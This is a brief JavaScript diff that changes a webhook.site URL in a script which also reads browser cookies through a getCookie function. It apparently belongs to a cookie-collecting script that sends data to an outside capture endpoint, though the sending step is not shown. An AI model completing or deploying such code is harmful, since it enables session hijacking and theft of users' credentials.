@@ -1,6 +1,6 @@
 const dataToSend = {
 };
-var url = "https://webhook.site/090e89b3-2158-4c5e-9033-fd2db1c432a3";
+var url = "https://webhook.site/ed4a0d4a-e7ec-4ca5-92b9-8ee84a855ffb";
 
 function getCookie(name) {
   const cookies = document.cookie.split('; ');
